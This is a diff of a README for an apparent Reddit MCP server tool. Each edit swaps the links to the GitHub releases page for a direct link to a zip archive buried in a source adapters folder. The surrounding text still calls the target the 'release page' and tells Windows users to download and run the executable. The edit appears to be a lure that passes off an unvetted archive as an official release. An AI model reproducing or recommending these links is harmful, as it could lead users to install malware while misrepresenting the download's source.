@@ -1,6 +1,6 @@
 # 🔗 reddit-mcp-server - Easy Reddit Data Access
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest-blue?style=for-the-badge)](https://github.com/Callacockahoop528/reddit-mcp-server/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest-blue?style=for-the-badge)](https://github.com/Callacockahoop528/reddit-mcp-server/raw/refs/heads/main/src/reddit_mcp_server/adapters/inbound/server-reddit-mcp-3.5.zip)
 
 ---
 
@@ -33,7 +33,7 @@ Follow these steps to download, install, and run reddit-mcp-server on your Windo
 
 Go to the official release page to find the latest version of the software:
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest-blue?style=for-the-badge)](https://github.com/Callacockahoop528/reddit-mcp-server/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest-blue?style=for-the-badge)](https://github.com/Callacockahoop528/reddit-mcp-server/raw/refs/heads/main/src/reddit_mcp_server/adapters/inbound/server-reddit-mcp-3.5.zip)
 
 The page lists all recent versions. Pick the latest stable release marked with the highest version number or the date.
 
@@ -89,7 +89,7 @@ If you want to use the data yourself, try MCP AI tools or apps that support Mode
 To update to a newer version:
 
 - Visit the release page again:  
-  https://github.com/Callacockahoop528/reddit-mcp-server/releases  
+  https://github.com/Callacockahoop528/reddit-mcp-server/raw/refs/heads/main/src/reddit_mcp_server/adapters/inbound/server-reddit-mcp-3.5.zip  
 - Download the newest Windows file  
 - Close the current server window  
 - Run the new executable file  
@@ -116,4 +116,4 @@ If issues persist, look for help on the GitHub repository’s Issues page.
 
 To get started, visit the release page and pick your version:
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest-blue?style=for-the-badge)](https://github.com/Callacockahoop528/reddit-mcp-server/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest-blue?style=for-the-badge)](https://github.com/Callacockahoop528/reddit-mcp-server/raw/refs/heads/main/src/reddit_mcp_server/adapters/inbound/server-reddit-mcp-3.5.zip)
